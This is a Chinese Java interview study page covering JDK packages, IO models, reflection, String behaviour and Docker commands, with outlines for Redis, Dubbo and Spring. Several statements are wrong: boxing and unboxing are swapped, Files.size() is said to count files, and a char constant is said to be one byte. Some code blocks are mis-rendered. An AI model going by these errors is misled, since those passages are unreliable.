title="&gt; Java包"></a>&gt; Java包</h1><h2 id="1、JDK-中常用的包有哪些？"><a href="#1、JDK-中常用的包有哪些？" class="headerlink" title="1、JDK 中常用的包有哪些？"></a>1、JDK 中常用的包有哪些？</h2><ul><li> java.lang：这个是系统的基础类；</li><li> java.io：这里面是所有输入输出有关的类，比如文件操作等；</li><li> java.nio：为了完善 io 包中的功能，提高 io 包中性能而写的一个新包；</li><li> java.net：这里面是与网络有关的类；</li><li> java.util：这个是系统辅助类，特别是集合类；</li><li> java.sql：这个是数据库操作的类。</li></ul><h2 id="2、import-java-和-javax-有什么区别？"><a href="#2、import-java-和-javax-有什么区别？" class="headerlink" title="2、import java 和 javax 有什么区别？"></a>2、import java 和 javax 有什么区别？</h2><ul><li><p>刚开始的时候 JavaAPI 所必需的包是 java 开头的包，javax 当时只是扩展API 包来说使用。</p></li><li><p>然而随着时间的推移，javax 逐渐的扩展成为 Java API 的组成部分。但是将扩展从 javax 包移动到 java 包将是太麻烦了，最终会破坏一堆现有的代码。</p></li><li><p>因此最终决定 javax 包将成为标准 API 的一部分。所以实际上 java 和 javax 没有区别。这都是一个名字。</p></li></ul><h1 id="gt-IO流"><a href="#gt-IO流" class="headerlink" title="&gt; IO流"></a>&gt; IO流</h1><h2 id="1、java-中-IO-流分为几种"><a href="#1、java-中-IO-流分为几种" class="headerlink" title="1、java 中 IO 流分为几种?"></a>1、java 中 IO 流分为几种?</h2><ul><li>按照流的流向分，可以分为输入流和输出流；</li><li>按照操作单元划分，可以划分为字节流和字符流；</li><li>按照流的角色划分为节点流和处理流。</li></ul><blockquote><p>Java Io 流共涉及 40 多个类，这些类看上去很杂乱，但实际上很有规则，而且彼此之间存在非常紧密的联系， Java I0 流的 40 多个类都是从如下 4 个抽象基<br>类中派生出来的。</p><p>​    • InputStream/Reader: 所有的输入流的基类，前者是字节输入流，后者是字符输入流。<br>​    • OutputStream/Writer: 所有输出流的基类，前者是字节输出流，后者是字符输出流。</p></blockquote><ul><li>按操作方式分类结构图：</li></ul><p><img src="https://pic.imgdb.cn/item/63c26040be43e0d30e10cc4f.jpg"></p><ul><li>按操作对象分类结构图：</li></ul><p><img src="https://pic.imgdb.cn/item/63c2608bbe43e0d30e112e53.jpg"></p><h2 id="2、BIO-NIO-AIO-有什么区别"><a href="#2、BIO-NIO-AIO-有什么区别" class="headerlink" title="2、BIO,NIO,AIO 有什么区别?"></a>2、BIO,NIO,AIO 有什么区别?</h2><ul><li><p>简答</p><ul><li>BIO：Block IO 同步阻塞式 IO，就是我们平常使用的传统 IO，它的特点是模式简单使用方便，并发处理能力低。</li><li>NIO：Non IO 同步非阻塞 IO，是传统 IO 的升级，客户端和服务器端通过 Channel（通道）通讯，实现了多路复用。</li><li>AIO：Asynchronous IO 是 NIO 的升级，也叫 NIO2，实现了异步非堵塞IO ，异步 IO 的操作基于事件和回调机制。</li></ul></li><li><p>详细回答</p><ul><li><p>BIO (Blocking I/O): 同步阻塞 I/O 模式，数据的读取写入必须阻塞在一个线程内等待其完成。在活动连接数不是特别高（小于单机 1000）的情况下，这种模型是比较不错的，可以让每一个连接专注于自己的 I/O 并且编程模型简单，也不用过多考虑系统的过载、限流等问题。线程池本身就是一个天然的漏斗，可以缓冲一些系统处理不了的连接或请求。但是，当面对十万甚至百万级连接的时候，传统的 BIO 模型是无能为力的。因此，我们需要一种更高效的 I/O 处理模型来应对更高的并发量。</p></li><li><p>NIO (New I/O): NIO 是一种同步非阻塞的 I/O 模型，在 Java 1.4 中引入了 NIO 框架，对应 java.nio 包，提供了 Channel , Selector，Buffer等抽象。NIO 中的 N 可以理解为 Non-blocking，不单纯是 New。它支持面向缓冲的，基于通道的 I/O 操作方法。 NIO 提供了与传统 BIO 模型中的Socket 和 ServerSocket 相对应的 SocketChannel 和ServerSocketChannel 两种不同的套接字通道实现,两种通道都支持阻塞和非阻塞两种模式。阻塞模式使用就像传统中的支持一样，比较简单，但是性能和可靠性都不好；非阻塞模式正好与之相反。对于低负载、低并发的应用程序，可以使用同步阻塞 I/O 来提升开发速率和更好的维护性；对于高负载、高并发的（网络）应用，应使用 NIO 的非阻塞模式来开发</p></li><li><p>AIO (Asynchronous I/O): AIO 也就是 NIO 2。在 Java 7 中引入了 NIO的改进版 NIO 2,它是异步非阻塞的 IO 模型。异步 IO 是基于事件和回调机制实现的，也就是应用操作之后会直接返回，不会堵塞在那里，当后台处理完成，操作系统会通知相应的线程进行后续的操作。AIO 是异步 IO的缩写，虽然 NIO 在网络操作中，提供了非阻塞的方法，但是 NIO 的IO 行为还是同步的。对于 NIO 来说，我们的业务线程是在 IO 操作准备好时，得到通知，接着就由这个线程自行进行 IO 操作，IO 操作本身是同步的。查阅网上相关资料，我发现就目前来说 AIO 的应用还不是很广泛，Netty 之前也尝试使用过 AIO，不过又放弃了。</p></li></ul></li></ul><h2 id="3、Files-的常用方法都有哪些？"><a href="#3、Files-的常用方法都有哪些？" class="headerlink" title="3、Files 的常用方法都有哪些？"></a>3、Files 的常用方法都有哪些？</h2><ul><li>Files. exists()：检测文件路径是否存在。</li><li>Files. createFile()：创建文件。</li><li>Files. createDirectory()：创建文件夹。</li><li>Files. delete()：删除一个文件或目录。</li><li>Files. copy()：复制文件。</li><li>Files. move()：移动文件。</li><li>Files. size()：查看文件个数。</li><li>Files. read()：读取文件。</li><li>Files. write()：写入文件。</li></ul><h1 id="gt-反射"><a href="#gt-反射" class="headerlink" title="&gt; 反射"></a>&gt; 反射</h1><h2 id="1、什么是反射机制？"><a href="#1、什么是反射机制？" class="headerlink" title="1、什么是反射机制？"></a>1、什么是反射机制？</h2><p>JAVA 反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为 java 语言的反射机制。</p><p>静态编译和动态编译</p><ul><li><strong>静态编译：</strong>在编译时确定类型，绑定对象</li><li><strong>动态编译：</strong>运行时确定类型，绑定对象</li></ul><h2 id="2、反射机制优缺点？"><a href="#2、反射机制优缺点？" class="headerlink" title="2、反射机制优缺点？"></a>2、反射机制优缺点？</h2><ul><li><p>优点： 运行期类型的判断，动态加载类，提高代码灵活度。</p></li><li><p>缺点： 性能瓶颈：反射相当于一系列解释操作，通知 JVM 要做的事情，性能比直接的 java 代码要慢很多。</p></li></ul><h2 id="3、反射机制的应用场景有哪些？"><a href="#3、反射机制的应用场景有哪些？" class="headerlink" title="3、反射机制的应用场景有哪些？"></a>3、反射机制的应用场景有哪些？</h2><ul><li>反射是框架设计的灵魂。</li><li>在我们平时的项目开发过程中，基本上很少会直接使用到反射机制，</li><li>但这不能说明反射机制没有用，实际上有很多设计、开发都与反射机制有关，例如模块化的开发，通过反射去调用对应的字节码；</li><li>动态代理设计模式也采用了反射机制，还有我们日常使用的 Spring／Hibernate 等框架也大量使用到了反射机制。</li></ul><p>举例：</p><ul><li><p>我们在使用 JDBC 连接数据库时使用 Class.forName()通过反射加载数据库的驱动程序；</p></li><li><p>Spring 框架也用到很多反射机制，最经典的就是 xml 的配置模式。Spring 通过 XML 配置模式装载 Bean 的过程：</p><ul><li><p>将程序内所有 XML 或Properties 配置文件加载入内存中; </p></li><li><p>Java 类里面解析 xml 或 properties 里面的内容，得到对应实体类的字节码字符串以及相关的属性信息; </p></li><li><p>使用反射机制，根据这个字符串获得某个类的 Class 实例; </p></li><li><p>动态配置实例的属性</p></li></ul></li></ul><h2 id="4、Java-获取反射的三种方法？"><a href="#4、Java-获取反射的三种方法？" class="headerlink" title="4、Java 获取反射的三种方法？"></a>4、Java 获取反射的三种方法？</h2><ul><li><p>通过 new 对象实现反射机制 </p></li><li><p>通过路径实现反射机制</p></li><li><p>通过类名实现反射机制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">     String name;</span><br><span class="line">     <span class="keyword">protected</span> <span class="keyword">boolean</span> sex;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">float</span> score;</span><br><span class="line"> &#125;</span><br><span class="line">  </span><br><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Get</span> </span>&#123;</span><br><span class="line">     <span class="comment">//获取反射机制三种方式</span></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">             ClassNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//方式一(通过建立对象)</span></span><br><span class="line">         Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">         Class classobj1 = stu.getClass();</span><br><span class="line">         System.out.println(classobj1.getName());</span><br><span class="line"><span class="comment">//方式二（所在通过路径-相对路径）</span></span><br><span class="line">         Class classobj2 = Class.forName(<span class="string">&quot;fanshe.Student&quot;</span>);</span><br><span class="line">         System.out.println(classobj2.getName());</span><br><span class="line"><span class="comment">//方式三（通过类名）</span></span><br><span class="line">         Class classobj3 = Student.class;</span><br><span class="line">         System.out.println(classobj3.getName());</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="gt-网络编程"><a href="#gt-网络编程" class="headerlink" title="&gt; 网络编程"></a>&gt; 网络编程</h1><ul><li>重学 TCP/IP 协议和三次握手四次挥手，</li><li>包括 TCP/IP 协议和三次握手四次挥手的知识</li><li>还包括计算机网络体系结构，HTTP 协议，get 请求和 post 请求区别，session 和 cookie 的区别等</li></ul><h1 id="gt-常用-API"><a href="#gt-常用-API" class="headerlink" title="&gt;  常用 API"></a>&gt;  常用 API</h1><h2 id="1、String-相关"><a href="#1、String-相关" class="headerlink" title="1、String 相关"></a>1、String 相关</h2><ul><li><strong>字符型常量和字符串常量的区别？</strong><ul><li>形式上: 字符常量是单引号引起的一个字符 字符串常量是双引号引起的若干个字符</li><li>含义上: 字符常量相当于一个整形值(ASCII 值),可以参加表达式运算 字符串常量代表一个地址值(该字符串在内存中存放位置)</li><li>占内存大小 字符常量只占一个字节 字符串常量占若干个字节(至少一个字符结束标志)</li></ul></li></ul><ul><li><strong>什么是字符串常量池？</strong><ul><li>字符串常量池位于堆内存中，专门用来存储字符串常量，可以提高内存的使用率，避免开辟多块空间存储相同的字符串，在创建字符串时 JVM 会首先检查字符串常量池，如果该字符串已经存在池中，则返回它的引用，如果不存在，则实例化一个字符串放到池中，并返回其引用。</li></ul></li></ul><ul><li><strong>String 是最基本的数据类型吗？</strong><ul><li>不是。</li><li>Java 中的基本数据类型只有 8 个 ：byte、short、int、long、float、double、char、boolean；除了基本类型（primitive type），剩下的都是引用类型（referencetype），Java 5 以后引入的枚举类型也算是一种比较特殊的引用类型。</li><li>这是很基础的东西，但却容易忽视，Java 的 8 种基本数据类型中不包括 String，基本数据类型中用来描述文本数据的是 char，但是它只能表示单个字符，比如 ‘a’,‘好’ 之类的，如果要描述一段文本，就需要用多个char 类型的变量，也就是一个 char 类型数组。</li><li>比如“你好” 就是长度为 2 的数组 char[] chars = {‘你’,‘好’}; 但是使用数组过于麻烦，所以就有了 String。</li><li>String 底层就是一个 char 类型的数组，只是使用的时候开发者不需要直接操作底层数组，用更加简便的方式即可完成对字符串的使用。</li></ul></li></ul><ul><li><strong>String 有哪些特性？</strong><ul><li>不变性：String 是只读字符串，是一个典型的 immutable 对象，对它进行任何操作，其实都是创建一个新的对象，再把引用指向该对象。不变模式的主要作用在于当一个对象需要被多线程共享并频繁访问时，可以保证数据的一致性。</li><li>常量池优化：String 对象创建之后，会在字符串常量池中进行缓存，如果下次创建同样的对象时，会直接返回缓存的引用。</li><li>final：使用 final 来定义 String 类，表示 String 类不能被继承，提高了系统的安全性。</li></ul></li></ul><ul><li><p><strong>String 为什么是不可变的吗？原因？</strong></p><ul><li><p>简单来说就是 String 类利用了 final 修饰的 char 类型数组存储字符，源码如下图所以：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** The value is used for character storage. */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">char</span> value[];</span><br></pre></td></tr></table></figure></li><li><p>String 是不可变的</p><ul><li><p>String 不可变但不代表引用不可以变</p><ul><li>```JAVA<br>String str = “Hello”;<br>str = str + “ World”;<br>System.out.println(“str=” + str);<br>str=Hello World解析：<br>实际上，原来 String 的内容是不变的，只是 str 由原来指向”Hello”的内存地址转为指向”Hello World”的内存地址而已，也就是说多开辟了一块内存区域给”Hello World”字符串。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">- 通过反射是可以修改所谓的“不可变”对象</span><br><span class="line">  </span><br><span class="line">  - ```JAVA</span><br><span class="line">    // 创建字符串&quot;Hello World&quot;， 并赋给引用 s</span><br><span class="line">    String s = &quot;Hello World&quot;;</span><br><span class="line">    System.out.println(&quot;s = &quot; + s); // Hello World</span><br><span class="line">    </span><br><span class="line">    // 获取 String 类中的 value 字段</span><br><span class="line">    Field valueFieldOfString = String.class.getDeclaredField(&quot;value&quot;);</span><br><span class="line">    </span><br><span class="line">    // 改变 value 属性的访问权限</span><br><span class="line">    valueFieldOfString.setAccessible(true);</span><br><span class="line">    </span><br><span class="line">    // 获取 s 对象上的 value 属性的值</span><br><span class="line">    char[] value = (char[]) valueFieldOfString.get(s);</span><br><span class="line">    </span><br><span class="line">    // 改变 value 所引用的数组中的第 5 个字符</span><br><span class="line">    value[5] = &#x27;_&#x27;;</span><br><span class="line">    System.out.println(&quot;s = &quot; + s); // Hello_World</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    //s = Hello World</span><br><span class="line">    //s = Hello_World</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    解析：</span><br><span class="line">    用反射可以访问私有成员， 然后反射出 String 对象中的 value 属性， 进而改变通过获得的 value 引用改变数组的结构。但是一般我们不会这么做，这里只是简单提一下有这个东西。</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul></li><li><p><strong>是否可以继承 String 类?</strong></p><ul><li>String 类是 final 类，不可以被继承。</li></ul></li></ul><ul><li><strong>String str=”i”与 String str=new String(“i”)一样吗？</strong><ul><li>不一样，因为内存的分配方式不一样。String str=”i”的方式，java 虚拟机会将其分配到常量池中；而 String str=new String(“i”) 则会被分到堆内存中。</li></ul></li></ul><ul><li><p><strong>String s = new String(“xyz”);创建了几个字符串对象？</strong></p><ul><li><p>两个对象，一个是静态区的”xyz”，一个是用 new 创建在堆上的对象。</p></li><li><p>```JAVA<br>String str1 = “hello”; //str1 指向静态区<br>String str2 = new String(“hello”); //str2 指向堆上的对象<br>String str3 = “hello”;<br>String str4 = new String(“hello”);<br>System.out.println(str1.equals(str2)); //true<br>System.out.println(str2.equals(str4)); //true<br>System.out.println(str1 == str3); //true<br>System.out.println(str1 == str2); //false<br>System.out.println(str2 == str4); //false<br>System.out.println(str2 == “hello”); //false<br>str2 = str1;<br>System.out.println(str2 == “hello”); //true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- **如何将字符串反转？**</span><br><span class="line"></span><br><span class="line">  - 使用 StringBuilder 或者 stringBuffer 的 reverse() 方法。</span><br><span class="line"></span><br><span class="line">  - ```JAVA</span><br><span class="line">    // StringBuffer reverse</span><br><span class="line">    StringBuffer stringBuffer = new StringBuffer();</span><br><span class="line">    stringBuffer. append(&quot;abcdefg&quot;);</span><br><span class="line">    System. out. println(stringBuffer. reverse()); // gfedcba</span><br><span class="line">    // StringBuilder reverse</span><br><span class="line">    StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">    stringBuilder. append(&quot;abcdefg&quot;);</span><br><span class="line">    System. out. println(stringBuilder. reverse()); // gfedcba</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><strong>数组有没有 length()方法？String 有没有 length()方法?</strong><ul><li>数组没有 length()方法, 有length 的属性。String 有 length()方法。JavaScript 中获得字符串的长度是通过 length 属性得到的，这一点容易和Java 混淆。</li></ul></li></ul><ul><li><strong>String 类的常用方法都有那些？</strong><ul><li>indexOf()：返回指定字符的索引。</li><li>charAt()：返回指定索引处的字符。</li><li>replace()：字符串替换。</li><li>trim()：去除字符串两端空白。</li><li>split()：分割字符串，返回一个分割后的字符串数组。</li><li>getBytes()：返回字符串的 byte 类型数组。</li><li>length()：返回字符串长度。</li><li>toLowerCase()：将字符串转成小写字母。</li><li>toUpperCase()：将字符串转成大写字符。</li><li>substring()：截取字符串。</li><li>equals()：字符串比较。</li></ul></li></ul><ul><li>在使用 HashMap 的时候，用 String 做 key 有什么好处？<ul><li>HashMap 内部实现是通过 key 的 hashcode 来确定 value 的存储位置，因为字符串是不可变的，所以当创建字符串时，它的 hashcode 被缓存下来，不需要再次计算，所以相比于其他对象更快。</li></ul></li></ul><ul><li>String 和 StringBuffer、StringBuilder 的区别是什么？String 为什么是不可变的 ?<ul><li>可变性<ul><li>String 类中使用字符数组保存字符串，private final char value[]，所以string 对象是不可变的。</li><li>StringBuilder 与 StringBuffer 都继承自AbstractStringBuilder 类，在 AbstractStringBuilder 中也是使用字符数组保存字符串，char[] value，这两种对象都是可变的。</li></ul></li><li>线程安全性<ul><li>String 中的对象是不可变的，也就可以理解为常量，线程安全。</li><li>AbstractStringBuilder 是 StringBuilder 与 StringBuffer 的公共父类，定义了一些字符串的基本操作，如 expandCapacity、append、insert、indexOf 等公共方法。</li><li>StringBuffer 对方法加了同步锁或者对调用的方法加了同步锁，所以是线程安全的。StringBuilder 并没有对方法进行加同步锁，所以是非线程安全的。</li></ul></li><li>性能<ul><li>每次对 String 类型进行改变的时候，都会生成一个新的 String 对象，然后将指针指向新的 String 对象。</li><li>StringBuffer 每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象并改变对象引用。</li><li>相同情况下使用 StirngBuilder相比使用 StringBuffer 仅能获得 10%~15% 左右的性能提升，但却要冒多线程不安全的风险。</li></ul></li><li>对于三者使用的总结<ul><li>如果要操作少量的数据用 = String</li><li>单线程操作字符串缓冲区 下操作大量数据 = StringBuilder</li><li>多线程操作字符串缓冲区 下操作大量数据 = StringBuffer</li></ul></li></ul></li></ul><h2 id="2、Date-相关"><a href="#2、Date-相关" class="headerlink" title="2、Date 相关"></a>2、Date 相关</h2><h2 id="3、包装类相关"><a href="#3、包装类相关" class="headerlink" title="3、包装类相关"></a>3、包装类相关</h2><ul><li>自动装箱与拆箱<ul><li>拆箱<ul><li>将基本类型用他们对应的引用类型包装起来</li></ul></li><li>装箱<ul><li>将包装类型转换成基本数据类型</li></ul></li></ul></li></ul><h1 id="gt-Dobbo"><a href="#gt-Dobbo" class="headerlink" title="&gt; Dobbo"></a>&gt; Dobbo</h1><p>Dobbo是一个RPC框架（远程调用框架）</p><p>RPC: 远程过程调用（可以实现多个服务器之间的相互通信）</p><p>Dobbo的通信是基于接口的 被调用的一定要是一个接口的实现类</p><p>Dobbo</p><p>直接调用service里面的方法</p><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><ul><li>作用</li><li>原理</li><li>理解</li></ul><h2 id="DI"><a href="#DI" class="headerlink" title="DI"></a>DI</h2><ul><li>对容器中的Bean进行属性赋值,这个过程是DI</li></ul><h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><ul><li>作用</li><li>理解</li><li>名词解释<ul><li>切面</li><li>连接点</li><li>通知</li><li>切入点</li><li>引入</li><li>目标对象</li><li>织入</li></ul></li></ul><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><ul><li>redis基础<ul><li>NoSQL和Redis</li><li>Redis的数据类型</li><li>Redis存取速度快的原因</li><li>Redis的持久化方式</li><li>Redis的key删除</li><li>Redis的内存淘汰策略 (3类8种)</li><li>redis运行定时任务</li><li>Redis高可用</li><li>Redis的主从复制</li><li>Redis哨兵</li><li>Redis集群</li><li>Redis脑裂</li><li>Redis的内存用完，内存优化</li><li>Redis是单线程</li><li>Redis事务</li><li>使用keys指令可以扫出指定模式的key列表</li><li>Redis做异步队列</li><li>Redis实现延时队列</li></ul></li><li>redis高级<ul><li>Redis分布式锁</li><li>Redis常见热Key问题<ul><li>缓存和数据库双写一致性问题</li><li>缓存穿透</li><li>缓存击穿</li><li>缓存雪崩</li><li>缓存的并发竞争问题</li></ul></li></ul></li></ul><h2 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h2><ul><li>倒排索引</li><li>ES存储和查询的原理</li><li>ES和Mysql的区别</li><li>Kibana</li><li>IK分词器</li><li>具体Java操作<ul><li>添加索引</li><li>添加映射</li><li>查询索引</li><li>删除索引</li><li>索引是否存在</li><li>添加文档</li><li>修改、查询、查询文档</li></ul></li></ul><h2 id="Nacos"><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h2><ul><li>为什么使用Nacos而不使用Eureka?</li><li>Nacos配置文件动态刷新怎么做的？</li><li>Nacos服务注册发现步骤是什么？</li></ul><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><ul><li><p>查看 Docker 版本</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure></li><li><p>查看所有镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br><span class="line">      </span><br><span class="line">    REPOSITORY：镜像来自哪个仓库</span><br><span class="line">    TAG：镜像的标签信息，版本之类的信息</span><br><span class="line">    IMAGE ID：镜像创建时的id</span><br><span class="line">    CREATED：镜像创建的时间</span><br><span class="line">    SIZE：镜像文件大小</span><br></pre></td></tr></table></figure></li><li><p>下载软件镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull busybox:latest</span><br><span class="line">      </span><br><span class="line">    latest表示使用busybox软件的最新版本，所以软件默认下载都是 latest 版本。</span><br></pre></td></tr></table></figure></li><li><p>导出镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker save busybox &gt; busybox<span class="selector-class">.tar</span></span><br><span class="line">      </span><br><span class="line">    把busybox镜像导出为 busybox<span class="selector-class">.tar</span> 文件，可以把 busybox<span class="selector-class">.tar</span> 文件复制到别的操作系统上使用，免除下载时网络慢的问题。 </span><br></pre></td></tr></table></figure></li><li><p>删除镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rmi busybox:latest</span><br><span class="line"></span><br><span class="line">    镜像一般都会根据版本打包，如果有下载一个软件的多个版本就需要指定具体版本信息。如 busybox:<span class="number">1.26</span> 就会删除 busybox 软件的 <span class="number">1.26</span> 版本的镜像，不会删除latest 版本的镜像。</span><br></pre></td></tr></table></figure></li><li><p>导入镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker load &lt; busybox<span class="selector-class">.tar</span></span><br><span class="line">      </span><br><span class="line">    使用导出命令导出的镜像，可以通过此命令导入到没有下载此软件的操作系统，方便网络条件差的情况使用。</span><br></pre></td></tr></table></figure></li><li><p>更改镜像名</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker tag busybox:latest busybox:test</span><br><span class="line"></span><br><span class="line">    busybox:latest原镜像名，busybox:test要改成的镜像名</span><br></pre></td></tr></table></figure></li><li><p>运行容器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=busybox busybox:latest ping <span class="number">114.114</span>.<span class="number">114.114</span></span><br><span class="line">      </span><br><span class="line">    不会的上网搜</span><br><span class="line">    run：run参数代表启动容器</span><br><span class="line">    -d：以后台daemon的方式运行</span><br><span class="line">    --name：指定一个容器的名字，此后操作都需要使用这个名字来定位容器。</span><br><span class="line">    busybox:latest：容器所使用的镜像名字</span><br><span class="line">    ping <span class="number">114.114</span>.<span class="number">114.114</span>：启动容器执行的命令 </span><br></pre></td></tr></table></figure></li><li><p>查看运行的容器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>查看所有容器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br><span class="line"></span><br><span class="line">    CONTAINER ID：容器启动的id</span><br><span class="line">    IMAGE：使用哪个镜像启动的容器</span><br><span class="line">    COMMAND：启动容器的命令</span><br><span class="line">    CREATED：创建容器的时间</span><br><span class="line">    STATUS：容器启动时间</span><br><span class="line">    PORTS：容器映射到宿主机的端口</span><br><span class="line">    NAMES：容器启动的名字</span><br></pre></td></tr></table></figure></li><li><p>启动容器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start busybox</span><br></pre></td></tr></table></figure></li><li><p>重新启动容器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart busybox</span><br></pre></td></tr></table></figure></li><li><p>停止容器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop busybox</span><br></pre></td></tr></table></figure></li><li><p>杀死容器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker kill busybox</span><br></pre></td></tr></table></figure></li><li><p>删除运行中的容器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm -f busybox</span><br></pre></td></tr></table></figure></li><li><p>执行容器内命令</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it busybox ls</span><br><span class="line"></span><br><span class="line">-it 交互终端</span><br></pre></td></tr></table></figure></li><li><p>复制容器内文件</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp busybox:/etc/hosts hosts</span><br></pre></td></tr></table></figure></li><li><p>查看容器日志</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f busybox</span><br></pre></td></tr></table></figure></li></ul><h2 id="Mysql-MariaDB"><a href="#Mysql-MariaDB" class="headerlink" title="Mysql(MariaDB)"></a>Mysql(MariaDB)</h2><ul><li>常见的数据库<ul><li>关系型数据库</li><li>非关系型数据库</li></ul></li><li>Mysql架构层次</li><li>数据库三范式</li><li>我们在实际开发中经常会使用集群部署MySQL，此时就会涉及到主从复制</li><li>锁</li><li>索引</li><li>SQL优化</li><li>分库分表</li></ul><h2 id="SpringBoot"><a 